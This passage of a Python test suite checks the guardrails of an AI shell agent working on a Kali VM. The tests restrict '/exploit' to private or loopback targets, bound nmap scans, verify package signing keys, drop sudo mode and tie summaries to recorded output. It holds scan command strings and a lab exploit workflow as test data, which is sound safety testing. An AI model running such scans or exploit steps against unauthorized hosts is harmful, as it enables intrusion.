        self.assertIn("demo.service", workflow.observed_systemd_units)

        issue = deep_agent._model_command_issue(
            "systemctl start other.service", "start demo", workflow=workflow,
        )
        self.assertIn("not observed in the recorded", issue)

        incomplete = deep_agent.KaliWorkflow("start demo")
        self.assertIsNone(incomplete.begin("systemctl list-unit-files"))
        self.assertIsNone(incomplete.finish_command({
            "command": "systemctl list-unit-files",
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
            "output_truncated": True, "stdout": "demo.service disabled enabled\n", "stderr": "",
        }))
        self.assertFalse(incomplete.systemd_inventory_complete)
        self.assertFalse(incomplete.observed_systemd_units)

    def test_package_changes_invalidate_previously_observed_systemd_unit_names(self):
        workflow = deep_agent.KaliWorkflow("install and start demo")
        self.assertIsNone(workflow.begin("systemctl list-unit-files"))
        self.assertIsNone(workflow.finish_command({
            "command": "systemctl list-unit-files",
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
            "output_truncated": False, "stdout": "demo.service disabled enabled\n", "stderr": "",
        }))
        self.assertTrue(workflow.systemd_inventory_complete)

        self.assertIsNone(workflow.begin("apt-get install demo", purpose="change"))
        self.assertIsNone(workflow.finish_command({
            "command": "apt-get install demo",
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
        }))
        self.assertFalse(workflow.systemd_inventory_complete)
        self.assertFalse(workflow.observed_systemd_units)

    def test_outcome_status_distinguishes_success_stale_and_incomplete_checks(self):
        checked = {
            "purpose": "verify",
            "expected_result": "active",
            "stdout": "active\n",
            "stderr": "",
            "execution": {
                "execution_state": "completed", "exit_code": 0,
                "output_truncated": False,
            },
        }
        self.assertIn("matched captured output", deep_agent._verification_status_note([checked]))
        self.assertIn("remains INFERRED", deep_agent._verification_status_note([checked]))

        mismatch = {**checked, "stdout": "inactive\n"}
        self.assertIn("did not match complete captured output", deep_agent._verification_status_note([mismatch]))

        changed_after_check = {
            "purpose": "change",
            "execution": {"execution_state": "completed", "exit_code": 0},
        }
        self.assertIn("after the last outcome check", deep_agent._verification_status_note([
            checked, changed_after_check,
        ]))

        incomplete = {
            "purpose": "verify",
            "expected_result": "active",
            "stdout": "",
            "stderr": "",
            "execution": {
                "execution_state": "completed", "exit_code": 0,
                "output_truncated": True,
            },
        }
        self.assertIn("capture was incomplete", deep_agent._verification_status_note([incomplete]))

    def test_research_call_after_state_change_is_stopped_before_search(self):
        inventory = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl list-unit-files",
            "purpose": "inspect",
            "hypothesis": "available systemd units",
            "expected_result": "demo.service",
        })
        change = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl start demo.service",
            "purpose": "change",
            "hypothesis": "service is stopped",
            "expected_result": "start request completes",
        })
        search = deep_agent._make_tool_call("web_search", {"query": "demo service documentation"})
        verify = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl is-active demo.service",
            "purpose": "verify",
            "hypothesis": "service availability",
            "expected_result": "exit_code=0",
        })
        preflight = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl is-active demo.service",
            "purpose": "verify",
            "hypothesis": "service is already active",
            "expected_result": "exit_code=0",
        })
        with patch.object(deep_agent, "_execute_web_search") as web_search:
            kali, _, output = self._run_chat(
                ["start the demo service"],
                [
                    {"content": "", "tool_calls": [inventory]},
                    {"content": "", "tool_calls": [preflight]},
                    {"content": "", "tool_calls": [change]},
                    {"content": "", "tool_calls": [search]},
                    {"content": "", "tool_calls": [verify]},
                    {"content": "The check returned active.", "tool_calls": []},
                ],
                run_records=[
                    {"stdout": "demo.service disabled enabled\n"},
                    {"stdout": "inactive\n", "exit_code": 3},
                    {"stdout": "Started demo.service\n"},
                    {"stdout": "active\n"},
                ],
            )
        web_search.assert_not_called()
        self.assertEqual(kali.run.call_count, 4)
        self.assertIn("matched the command exit status", output)
        self.assertIn("INFERRED", output)

    def test_install_request_router_normalizes_packages_and_chrome_aliases(self):
        self.assertEqual(deep_agent._package_install_request("install nmap"), {
            "display_name": "nmap", "package": "nmap", "vendor": None,
        })
        self.assertEqual(deep_agent._package_install_request("install Google Chrome"), {
            "display_name": "Google Chrome", "package": "google-chrome-stable", "vendor": "google-chrome",
        })
        self.assertEqual(deep_agent._package_install_request("install chrome on Kali"), {
            "display_name": "Google Chrome", "package": "google-chrome-stable", "vendor": "google-chrome",
        })
        self.assertIsNone(deep_agent._package_install_request("install /tmp/local.deb"))

    def test_short_kali_connection_phrases_are_deterministic(self):
        for phrase in ("connect kali", "connect to kali", "connect cali", "connect to cali",
                       "connect kalu", "connect to kalu", "connect me to kali vm"):
            with self.subTest(phrase=phrase):
                self.assertTrue(deep_agent._local_kali_connection_request(phrase))

    def test_exploit_workflow_requires_a_bounded_service_scan_first(self):
        target = "192.168.56.101"
        valid = f"nmap -n -sT -sV --top-ports 100 --host-timeout 45s {target}"
        self.assertIsNotNone(deep_agent._model_command_issue(
            f"ping -c 3 -W 1 {target}", "validate this lab", target,
            require_exploit_scan=True,
        ))
        self.assertIsNone(deep_agent._model_command_issue(
            valid, "validate this lab", target, require_exploit_scan=True,
        ))

    def test_exploit_scope_rejects_unbounded_or_aggressive_nmap_scans(self):
        target = "192.168.56.101"
        bad_commands = (
            f"nmap -sT -sV -p 1-10000 --host-timeout 45s {target}",
            f"nmap -sT -sV --top-ports 1001 --host-timeout 45s {target}",
            f"nmap -sT -sV --top-ports 100 {target}",
            f"nmap -sT -sV --host-timeout 45s {target}",
            f"nmap -sT -sV --top-ports 100 --host-timeout 46s {target}",
            f"nmap -sT --top-ports 100 --host-timeout 45s {target}",
            f"nmap -sT -sV -A --top-ports 100 --host-timeout 45s {target}",
        )
        for command in bad_commands:
            with self.subTest(command=command):
                issue = deep_agent._model_command_issue(command, "validate this lab", target)
                self.assertIsNotNone(issue)

    def test_exploit_workflow_replans_an_oversized_scan_before_ssh(self):
        target = "192.168.56.101"
        oversized = deep_agent._make_tool_call(
            "run_kali_command",
            {
                "command": f"nmap -sT -sV -p 1-10000 --host-timeout 45s {target}",
                "purpose": "test", "hypothesis": "bounded service scan", "expected_result": "exit_code=0",
            },
        )
        bounded_command = f"nmap -n -sT -sV --top-ports 100 --host-timeout 45s {target}"
        bounded = deep_agent._make_tool_call("run_kali_command", {
            "command": bounded_command, "purpose": "test", "hypothesis": "bounded service scan",
            "expected_result": "exit_code=0",
        })
        kali, calls, _ = self._run_chat(
            [f"/exploit {target}"],
            [
                {"content": "", "tool_calls": [oversized]},
                {"content": "", "tool_calls": [bounded]},
                {"content": "The bounded scan completed.", "tool_calls": []},
            ],
        )
        kali.run.assert_called_once_with(bounded_command)
        self.assertEqual([item[0] for item in calls], [True, True, True])
        correction = calls[1][2][-1]["content"]
        self.assertIn("may scan at most 1000", correction)

    def test_natural_exploit_request_uses_the_scoped_workflow(self):
        target = "192.168.56.101"
        oversized_command = f"nmap -n -sT -sV -p 1-10000 --host-timeout 45s {target}"
        bounded_command = f"nmap -n -sT -sV --top-ports 100 --host-timeout 45s {target}"
        oversized = deep_agent._make_tool_call("run_kali_command", {
            "command": oversized_command, "purpose": "test", "hypothesis": "bounded service scan",
            "expected_result": "exit_code=0",
        })
        bounded = deep_agent._make_tool_call("run_kali_command", {
            "command": bounded_command, "purpose": "test", "hypothesis": "bounded service scan",
            "expected_result": "exit_code=0",
        })
        kali, calls, _ = self._run_chat(
            [f"exploit {target}"],
            [
                {"content": "", "tool_calls": [oversized]},
                {"content": "", "tool_calls": [bounded]},
                {"content": "The bounded scan completed.", "tool_calls": []},
            ],
        )
        kali.run.assert_called_once_with(bounded_command)
        self.assertEqual([item[0] for item in calls], [True, True, True])
        self.assertIn("may scan at most 1000", calls[1][2][-1]["content"])

    def test_exploit_command_rejects_public_target_before_using_kali(self):
        kali, calls, output = self._run_chat(["/exploit 8.8.8.8"], [])
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("PRIVATE_IPV4", output)

    def test_exploit_target_accepts_only_private_or_loopback_ipv4(self):
        for target, expected in (
            ("192.168.56.101", "192.168.56.101"),
            ("127.0.0.1", "127.0.0.1"),
            ("8.8.8.8", None),
            ("example.com", None),
            ("2001:db8::1", None),
        ):
            with self.subTest(target=target):
                self.assertEqual(deep_agent._lab_exploit_target(target), expected)

    def test_slash_sudo_is_not_mistaken_for_bare_sudo(self):
        kali, calls, output = self._run_chat(["/sudo"], [])
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("Use `sudo` directly", output)
        self.assertNotIn("sudo..", output)

    def test_bare_sudo_validates_credentials_without_running_a_privileged_task(self):
        kali, calls, output = self._run_chat(
            ["sudo"], [], last_record={
                "command": "sudo",
                "privilege_mode": "sudo_validation",
                "sudo_access_validated": True,
                "exit_code": 0,
            },
        )
        kali.run.assert_called_once_with("sudo")
        self.assertEqual(calls, [])
        self.assertIn("Sudo authentication succeeded", output)
        self.assertIn("Sudo mode is enabled", output)

    def test_bare_sudo_reports_failed_validation_without_claiming_access(self):
        _, calls, output = self._run_chat(
            ["sudo"], [], last_record={
                "command": "sudo",
                "privilege_mode": "sudo_validation",
                "sudo_access_validated": False,
                "exit_code": 1,
            },
        )
        self.assertEqual(calls, [])
        self.assertIn("sudo check did not succeed", output)
        self.assertNotIn("Sudo authentication succeeded", output)

    def test_user_command_disables_session_sudo_mode(self):
        kali, calls, output = self._run_chat(["/user"], [], sudo_mode=True)
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertFalse(kali.sudo_mode)
        self.assertIn("Sudo mode disabled", output)

    def test_sudo_placeholders_are_rejected_before_reaching_kali(self):
        cases = (
            ("sudo command", "Replace the sudo placeholder"),
            ("sudo <COMMAND>", "Replace the sudo placeholder"),
        )
        for user_input, hint in cases:
            with self.subTest(user_input=user_input):
                kali, calls, output = self._run_chat([user_input], [])
                kali.run.assert_not_called()
                self.assertEqual(calls, [])
                self.assertIn("No Kali command ran", output)
                self.assertIn(hint, output)

    def test_quoted_multiword_example_is_conversation_without_kali_tools(self):
        kali, calls, output = self._run_chat(
            ["'sudo command'"],
            [{"content": "That is quoted example text, not a command.", "tool_calls": []}],
        )
        kali.run.assert_not_called()
        self.assertEqual([call[0] for call in calls], [False])
        self.assertNotIn("sudo command: command not found", output)

    def test_shell_requests_from_report_offer_tools(self):
        for request in ("make a personal portfolio website on apache", "give the url",
                        "Where's the url", "connect to the web server"):
            with self.subTest(request=request):
                kali, calls, output = self._run_chat(
                    [request], [{"content": "Which hostname should I use?", "tool_calls": []}])
                self.assertTrue(calls[0][0])
                self.assertFalse(calls[0][1])
                self.assertEqual(output.count("Which hostname should I use?"), 1)
                kali.run.assert_not_called()

    def test_connect_to_kali_runs_a_direct_connection_check(self):
        kali, calls, output = self._run_chat(
            ["connect to kali"], [], last_record={
                "command": "hostname && whoami",
                "execution_state": "completed",
                "exit_code": 0,
                "stdout": "kali\nkali\n",
                "stderr": "",
                "timed_out": False,
            })
        kali.run.assert_called_once_with("hostname && whoami")
        self.assertEqual(calls, [])
        self.assertIn("Connected to Kali as kali on host kali.", output)

    def test_misspelled_local_kali_connect_does_not_consult_k2(self):
        for phrase in ("connect cali", "connect kalu", "connect kali"):
            with self.subTest(phrase=phrase):
                kali, calls, _ = self._run_chat([phrase], [], last_record={
                    "command": "hostname && whoami",
                    "execution_state": "completed",
                    "exit_code": 0,
                    "stdout": "kali\nkali\n",
                    "stderr": "",
                    "timed_out": False,
                })
                kali.run.assert_called_once_with("hostname && whoami")
                self.assertEqual(calls, [])

    def test_no_command_reports_no_action(self):
        kali, _, output = self._run_chat(
            ["check that server"], [{"content": "Which host did you mean?", "tool_calls": []}])
        kali.run.assert_not_called()
        self.assertIn("No Kali command ran for this request.", output)
        self.assertIn("Which host did you mean?", output)

    def test_natural_package_install_uses_controller_workflow_not_k2(self):
        with patch.object(deep_agent, "_run_package_install_workflow") as install:
            kali, calls, _ = self._run_chat(["install google chrome"], [])
        self.assertEqual(calls, [])
        kali.run.assert_not_called()
        install.assert_called_once_with(kali, unittest.mock.ANY, {
            "display_name": "Google Chrome", "package": "google-chrome-stable", "vendor": "google-chrome",
        })

    def test_google_chrome_workflow_uses_verified_signed_repository_and_checks_install(self):
        kali = Mock()
        kali.sudo_mode = False
        kali.clear_sudo_mode.side_effect = lambda: setattr(kali, "sudo_mode", False)
        commands = []
        policy_count = 0

        def execute(_kali, _messages, command, _call_id):
            nonlocal policy_count
            commands.append(command)
            stdout = ""
            record = {
                "command": command,
                "execution_state": "completed",
                "exit_code": 0,
                "stdout": stdout,
                "stderr": "",
                "timed_out": False,
                "privilege_mode": "user",
                "sudo_access_validated": False,
            }
            if command == "dpkg --print-architecture":
                stdout = "amd64\n"
            elif command == "apt-cache policy google-chrome-stable":
                policy_count += 1
                candidate = "(none)" if policy_count == 1 else "144.0.0.0-1"
                stdout = f"google-chrome-stable:\n  Installed: (none)\n  Candidate: {candidate}\n"
            elif command == "mktemp -d /tmp/deep-agent-apt.XXXXXX":
                stdout = "/tmp/deep-agent-apt.ABC123\n"
            elif command.startswith("gpg --batch --show-keys"):
                stdout = f"pub:::::::::D38B4796:\nfpr:::::::::{deep_agent.GOOGLE_LINUX_KEY_FINGERPRINT}:\n"
            elif command == "sudo":
                record.update({"privilege_mode": "sudo_validation", "sudo_access_validated": True})
                kali.sudo_mode = True
            elif command.startswith("dpkg-query -W"):
                stdout = "installed 144.0.0.0-1\n"
            elif command == "google-chrome --version":
                stdout = "Google Chrome 144.0.0.0\n"
            record["stdout"] = stdout
            kali.last_record = record
            return stdout

        messages = [{"role": "system", "content": "test"}, {"role": "user", "content": "install google chrome"}]
        with patch.object(deep_agent, "_execute_kali", side_effect=execute), contextlib.redirect_stdout(io.StringIO()):
            deep_agent._run_package_install_workflow(kali, messages, deep_agent._package_install_request("install google chrome"))

        self.assertTrue(any("https://dl.google.com/linux/linux_signing_key.pub" in command for command in commands))
        self.assertTrue(any("gpg --batch --show-keys --with-colons --fingerprint" in command for command in commands))
        self.assertTrue(any("signed-by=/etc/apt/keyrings/google-chrome.gpg" in command for command in commands))
        self.assertIn("apt-get update", commands)
        self.assertIn("apt-get install -y --no-install-recommends google-chrome-stable", commands)
        self.assertIn("dpkg-query", commands[-4])
        self.assertIn("google-chrome --version", commands)
        self.assertNotIn("apt-key", "\n".join(commands))
        self.assertNotIn("[key.pub]", "\n".join(commands))
        self.assertLess(commands.index("apt-get update"), commands.index("apt-get install -y --no-install-recommends google-chrome-stable"))
        self.assertIn("Installed and verified Google Chrome", messages[-1]["content"])
        kali.clear_sudo_mode.assert_called_once()
        self.assertFalse(kali.sudo_mode)

    def test_google_chrome_workflow_rejects_non_amd64_before_package_changes(self):
        kali = Mock()
        kali.sudo_mode = False
        commands = []

        def execute(_kali, _messages, command, _call_id):
            commands.append(command)
            kali.last_record = {
                "command": command,
                "execution_state": "completed",
                "exit_code": 0,
                "stdout": "arm64\n",
                "stderr": "",
                "timed_out": False,
            }
            return "arm64\n"

        messages = [{"role": "system", "content": "test"},
                    {"role": "user", "content": "install google chrome"}]
        with patch.object(deep_agent, "_execute_kali", side_effect=execute), contextlib.redirect_stdout(io.StringIO()):
            deep_agent._run_package_install_workflow(
                kali, messages, deep_agent._package_install_request("install google chrome"),
            )

        self.assertEqual(commands, ["dpkg --print-architecture"])
        self.assertIn("supports amd64", messages[-1]["content"])

    def test_google_chrome_workflow_blocks_untrusted_signing_key_before_privilege(self):
        kali = Mock()
        kali.sudo_mode = False
        commands = []

        def execute(_kali, _messages, command, _call_id):
            commands.append(command)
            stdout = ""
            if command == "dpkg --print-architecture":
                stdout = "amd64\n"
            elif command == "apt-cache policy google-chrome-stable":
                stdout = "google-chrome-stable:\n  Installed: (none)\n  Candidate: (none)\n"
            elif command == "mktemp -d /tmp/deep-agent-apt.XXXXXX":
                stdout = "/tmp/deep-agent-apt.DEF456\n"
            elif command.startswith("gpg --batch --show-keys"):
                stdout = "fpr:::::::::0000000000000000000000000000000000000000:\n"
            kali.last_record = {
                "command": command,
                "execution_state": "completed",
                "exit_code": 0,
                "stdout": stdout,
                "stderr": "",
                "timed_out": False,
            }
            return stdout

        messages = [{"role": "system", "content": "test"}]
        with patch.object(deep_agent, "_execute_kali", side_effect=execute), contextlib.redirect_stdout(io.StringIO()):
            deep_agent._run_package_install_workflow(kali, messages, deep_agent._package_install_request("install google chrome"))

        self.assertIn("did not match Google's published Linux key", messages[-1]["content"])
        self.assertFalse(any(command == "sudo" or command.startswith("install -") or "apt-get install" in command for command in commands))
        self.assertTrue(commands[-2].startswith("rm -f -- /tmp/deep-agent-apt.DEF456/"))
        self.assertEqual(commands[-1], "rmdir -- /tmp/deep-agent-apt.DEF456")

    def test_generic_package_workflow_stops_if_candidate_remains_missing(self):
        kali = Mock()
        kali.sudo_mode = False
        kali.clear_sudo_mode.side_effect = lambda: setattr(kali, "sudo_mode", False)
        commands = []
        policy_count = 0

        def execute(_kali, _messages, command, _call_id):
            nonlocal policy_count
            commands.append(command)
            stdout = ""
            record = {
                "command": command,
                "execution_state": "completed",
                "exit_code": 0,
                "stdout": "",
                "stderr": "",
                "timed_out": False,
                "privilege_mode": "user",
                "sudo_access_validated": False,
            }
            if command == "apt-cache policy sample-package":
                policy_count += 1
                stdout = "sample-package:\n  Installed: (none)\n  Candidate: (none)\n"
            elif command == "sudo":
                record.update({"privilege_mode": "sudo_validation", "sudo_access_validated": True})
                kali.sudo_mode = True
            record["stdout"] = stdout
            kali.last_record = record
            return stdout

        messages = [{"role": "system", "content": "test"}]
        with patch.object(deep_agent, "_execute_kali", side_effect=execute), contextlib.redirect_stdout(io.StringIO()):
            deep_agent._run_package_install_workflow(kali, messages, {
                "display_name": "sample package", "package": "sample-package", "vendor": None,
            })
        self.assertEqual(commands, [
            "apt-cache policy sample-package", "sudo", "apt-get update", "apt-cache policy sample-package",
        ])
        self.assertNotIn("apt-get install", commands)
        self.assertIn("no candidate", messages[-1]["content"])
        self.assertFalse(kali.sudo_mode)

    def test_package_install_confirmation_does_not_repeat_package_steps(self):
        kali, _calls, output = self._run_chat(
            ["install opera browser", "go ahead"], [],
            run_records=[
                {"stdout": "opera-browser:\n  Installed: (none)\n  Candidate: (none)\n"},
                {"privilege_mode": "sudo_validation", "sudo_access_validated": True},
                {"stdout": "Reading package lists...\\n"},
                {"stdout": "opera-browser:\n  Installed: (none)\n  Candidate: (none)\n"},
            ],
        )
        self.assertEqual(
            [call.args[0] for call in kali.run.call_args_list],
            ["apt-cache policy opera-browser", "sudo", "apt-get update", "apt-cache policy opera-browser"],
        )
        self.assertIn("No package command ran on this confirmation", output)
        self.assertIn("previous turn", output)

    def test_generic_package_workflow_installs_only_after_candidate_check_and_verifies(self):
        kali = Mock()
        kali.sudo_mode = False
        kali.clear_sudo_mode.side_effect = lambda: setattr(kali, "sudo_mode", False)
        commands = []

        def execute(_kali, _messages, command, _call_id):
            commands.append(command)
            stdout = ""
            record = {
                "command": command,
                "execution_state": "completed",
                "exit_code": 0,
                "stdout": "",
                "stderr": "",
                "timed_out": False,
                "privilege_mode": "user",
                "sudo_access_validated": False,
            }
            if command == "apt-cache policy nmap":
                stdout = "nmap:\n  Installed: (none)\n  Candidate: 7.95+dfsg-1\n"
            elif command == "sudo":
                record.update({"privilege_mode": "sudo_validation", "sudo_access_validated": True})
                kali.sudo_mode = True
            elif command.startswith("dpkg-query -W"):
                stdout = "installed 7.95+dfsg-1\n"
            record["stdout"] = stdout
            kali.last_record = record
            return stdout

        messages = [{"role": "system", "content": "test"}]
        with patch.object(deep_agent, "_execute_kali", side_effect=execute), contextlib.redirect_stdout(io.StringIO()):
            deep_agent._run_package_install_workflow(kali, messages, {
                "display_name": "nmap", "package": "nmap", "vendor": None,
            })
        self.assertEqual(commands[:3], [
            "apt-cache policy nmap",
            "sudo",
            "apt-get install -y --no-install-recommends nmap",
        ])
        self.assertEqual(len(commands), 4)
        self.assertTrue(commands[-1].startswith("dpkg-query -W"))
        self.assertNotIn("apt-get update", commands)
        self.assertIn("Installed and verified nmap package version 7.95+dfsg-1", messages[-1]["content"])
        self.assertFalse(kali.sudo_mode)

    def test_database_request_and_go_ahead_keep_tool_access(self):
        tool = deep_agent._make_tool_call("run_kali_command", {"command": "which mariadb"})
        kali, calls, output = self._run_chat(
            ["link this website to a database", "Go ahead"],
            [{"content": "Which database should I check?", "tool_calls": []},
             {"content": "", "tool_calls": [tool]},
             {"content": "The executable lookup completed.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("which mariadb")
        self.assertTrue(all(call[0] for call in calls))
        self.assertNotIn("tool request in its answer", output)

    def test_unlisted_shell_request_reaches_tools_without_word_allowlist(self):
        tool = deep_agent._make_tool_call("run_kali_command", {"command": "pwd"})
        kali, calls, _ = self._run_chat(
            ["tell me where we are working"],
            [{"content": "", "tool_calls": [tool]},
             {"content": "The working directory is shown above.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("pwd")
        self.assertTrue(all(call[0] for call in calls))

    def test_shell_greeting_does_not_execute_as_binary(self):
        kali, calls, output = self._run_chat(["hi"], [{"content": "Hello.", "tool_calls": []}])
        kali.run.assert_not_called()
        self.assertEqual([call[0] for call in calls], [False])
        self.assertNotIn("hi: command not found", output)

    def test_acknowledgment_does_not_become_escalation_target(self):
        kali, calls, output = self._run_chat(["escalate privileges", "yes"], [])
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("Please say `Kali VM` or provide a concrete authorized target", output)

    def test_conversational_tool_call_is_suppressed_and_reported(self):
        unexpected = deep_agent._make_tool_call("run_kali_command", {"command": "whoami"})
        kali, calls, output = self._run_chat(
            ["hi"], [{"content": "", "tool_calls": [unexpected]}],
        )
        kali.run.assert_not_called()
        self.assertEqual([call[0] for call in calls], [False])
        self.assertIn("No Kali command ran", output)

    def test_open_ended_question_uses_conversation_without_kali_tools(self):
        kali, calls, output = self._run_chat(
            ["Why did you do that?"],
            [{"content": "I followed the request from the previous turn.", "tool_calls": []}],
        )
        kali.run.assert_not_called()
        self.assertEqual([call[0] for call in calls], [False])
        self.assertEqual([call[1] for call in calls], [False])
        self.assertEqual(output.count("I followed the request"), 1)

    def test_acknowledgment_after_explanation_does_not_resume_completed_kali_task(self):
        kali, calls, _output = self._run_chat(
            ["hostname", "why?", "yes"],
            [
                {"content": "The hostname command printed kali.", "tool_calls": []},
                {"content": "That command reads the VM's configured host name.", "tool_calls": []},
                {"content": "Yes, it is a read-only check.", "tool_calls": []},
            ],
        )

        kali.run.assert_called_once_with("hostname")
        self.assertEqual([call[0] for call in calls], [False, False, False])

    def test_acknowledgment_after_explicit_kali_action_question_can_continue(self):
        check_ip = deep_agent._make_tool_call("run_kali_command", {"command": "hostname -I"})
        kali, calls, _output = self._run_chat(
            ["hostname", "yes"],
            [
                {"content": "The hostname check is complete. Would you like me to check its IP?",
                 "tool_calls": []},
                {"content": "", "tool_calls": [check_ip]},
                {"content": "Kali reported its IP address.", "tool_calls": []},
            ],
        )

        self.assertEqual([call.args[0] for call in kali.run.call_args_list], ["hostname", "hostname -I"])
        self.assertEqual([call[0] for call in calls], [False, True, True])

    def test_local_state_question_still_uses_kali_tools(self):
        tool = deep_agent._make_tool_call("run_kali_command", {"command": "hostname -I"})
        kali, calls, output = self._run_chat(
            ["What is my IP?"],
            [{"content": "", "tool_calls": [tool]},
             {"content": "Kali reported its IP address.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("hostname -I")
        self.assertTrue(all(call[0] for call in calls))
        self.assertIn("Kali reported its IP address", output)

    def test_result_question_uses_records_not_prior_assistant_claims(self):
        kali, calls, output = self._run_chat(
            ["cat /tmp/example.html", "what were the results?"],
            [{"content": "I created imaginary.html.", "tool_calls": []},
             {"content": "Only a read was recorded.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("cat /tmp/example.html")
        self.assertEqual([call[0] for call in calls], [False, False])
        self.assertNotIn("imaginary.html", str(calls[-1][2]))
        evidence = json.loads(calls[-1][2][-1]["content"])
        self.assertEqual(evidence["recorded_results"][0]["command"], "cat /tmp/example.html")
        self.assertIn("Only a read was recorded.", output)

    def test_rejected_summary_tool_call_displays_all_current_results(self):
        first = deep_agent._make_tool_call("run_kali_command", {"command": "printf first"})
        second = deep_agent._make_tool_call("run_kali_command", {"command": "printf second"})
        extra = deep_agent._make_tool_call("run_kali_command", {"command": "printf third"})
        kali, calls, output = self._run_chat(
            ["check Kali"],
            [{"content": "", "tool_calls": [first]},
             {"content": "", "tool_calls": [second]},
             {"content": "", "tool_calls": [second]},
             {"content": "", "tool_calls": [extra]},
             {"content": "done", "tool_calls": []}],
        )
        self.assertEqual(kali.run.call_count, 3)
        self.assertIn("Repeated Kali command skipped", output)
        self.assertIn("materially different", calls[3][2][-1]["content"])
        self.assertIn("Model interpretation", output)

    def test_summary_failure_retains_observed_output(self):
        messages = [{"role": "system", "content": deep_agent.SHELL_SYSTEM_PROMPT}]
        deep_agent._record_tool_result(messages, "cat /tmp/missing", "test", "No such file\n[exit 1]")
        output = io.StringIO()
        with patch.object(deep_agent, "_model_chat", side_effect=ConnectionError("offline")), contextlib.redirect_stdout(output):
            deep_agent._summarize_results(messages, deep_agent._execution_records(messages), "results?")
        self.assertIn("No such file", output.getvalue())
        self.assertIn("[exit 1]", output.getvalue())

    def test_no_op_summary_falls_back_to_recorded_command_output(self):
        messages = [{"role": "system", "content": deep_agent.SHELL_SYSTEM_PROMPT}]
        deep_agent._record_tool_result(messages, "cat /tmp/example", "test", "observed file text\n[exit 0]")
        output = io.StringIO()
        with (patch.object(deep_agent, "_model_chat", return_value={
                "content": "No response requested.", "tool_calls": []}),
              contextlib.redirect_stdout(output)):
            deep_agent._summarize_results(messages, deep_agent._execution_records(messages), "results?")
        self.assertIn("Recorded results follow", output.getvalue())
        self.assertIn("observed file text", output.getvalue())
        self.assertNotIn("No response requested", output.getvalue())
        self.assertNotIn("Model interpretation (INFERRED", output.getvalue())

    def test_results_with_no_records_cannot_run_a_tool(self):
        tool = deep_agent._make_tool_call("run_kali_command", {"command": "whoami"})
        kali, calls, output = self._run_chat(["results"], [{"content": "", "tool_calls": [tool]}])
        kali.run.assert_not_called()
        self.assertFalse(calls[0][0])
        self.assertIn("No Kali command results", output)

    def test_multistep_task_requires_outcome_check_before_completion(self):
        preflight = "curl -sS -i http://127.0.0.1/"
        create = "cat > /tmp/tic-tac-toe.html <<'EOF'\n<h1>Tic Tac Toe</h1>\nEOF"
        verification = "grep -F 'Tic Tac Toe' /tmp/tic-tac-toe.html"
        replies = [{"content": "", "tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {
                "command": preflight,
                "purpose": "verify",
                "hypothesis": "local website is already served",
                "expected_result": "HTTP/1.1 200 OK",
            },
        )]}]
        replies.append({"content": "", "tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {"command": create, "purpose": "change"},
        )]})
        replies.append({"content": "The page is complete.", "tool_calls": []})
        replies.append({"content": "", "tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {
                "command": verification,
                "purpose": "verify",
                "hypothesis": "requested page was written",
                "expected_result": "Tic Tac Toe",
            },
        )]})
        replies.append({"content": "The page was created and verified.", "tool_calls": []})
        kali, calls, output = self._run_chat(
            ["create a website on Kali"], replies,
            run_records=[
                {"stdout": "HTTP/1.1 200 OK\nPortfolio\n"},
                {"stdout": "page written\n"},
                {"stdout": "<h1>Tic Tac Toe</h1>\n"},
            ],
        )
        self.assertEqual(
            [call.args[0] for call in kali.run.call_args_list],
            [preflight, create, verification],
        )
        self.assertTrue(all(not call[1] for call in calls))
        self.assertNotIn("The page is complete.", output)
        self.assertEqual(output.count("The page was created and verified."), 1)
        self.assertIn("overall task assessment remains INFERRED", output)

    def test_task_continues_past_old_command_limit(self):
        replies = [{"content": "", "tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {"command": f"printf step{i}"})]}
            for i in range(15)]
        replies.append({"content": "", "tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {
                "command": "curl -fsS http://127.0.0.1/",
                "purpose": "verify",
                "hypothesis": "website responds",
                "expected_result": "exit_code=0",
            })]})
        replies.append({"content": "All steps completed.", "tool_calls": []})
        kali, calls, output = self._run_chat(["run a multistep diagnostic on Kali"], replies)
        self.assertEqual(kali.run.call_count, 16)
        self.assertEqual(kali.run.call_args_list[-1].args[0], "curl -fsS http://127.0.0.1/")
        self.assertTrue(calls[-2][0])
        self.assertFalse(calls[-1][0])
        self.assertNotIn("reached the command limit", output)
        self.assertIn("All steps completed.", output)

    def test_model_workflow_stops_at_its_command_budget(self):
        replies = [{"content": "", "tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {"command": f"printf step{i}"})]}
            for i in range(deep_agent.MAX_KALI_WORKFLOW_COMMANDS + 1)]
        kali, calls, output = self._run_chat(["check this lab"], replies)
        self.assertEqual(kali.run.call_count, deep_agent.MAX_KALI_WORKFLOW_COMMANDS)
        self.assertTrue(calls[-2][0])
        self.assertFalse(calls[-1][0])
        self.assertIn("20-command limit", output)

    def test_timed_out_model_command_stops_further_tools_and_summarizes(self):
        first = deep_agent._make_tool_call("run_kali_command", {"command": "sleep 200"})
        unused = deep_agent._make_tool_call("run_kali_command", {"command": "whoami"})
        kali, calls, output = self._run_chat(
            ["check Kali"],
            [{"content": "", "tool_calls": [first]}, {"content": "", "tool_calls": [unused]}],
            last_record={
                "command": "sleep 200",
                "execution_state": "timed_out",
                "exit_code": 124,
                "stdout": "",
                "stderr": "",
                "timed_out": True,
            },
        )
        kali.run.assert_called_once_with("sleep 200")
        self.assertEqual([call[0] for call in calls], [True, False])
        self.assertIn("command timed out", output)

    def test_long_running_server_timeout_is_classified_and_port_changes_are_same_strategy(self):
        command = "python3 -m http.server 8000"
        for banner in (
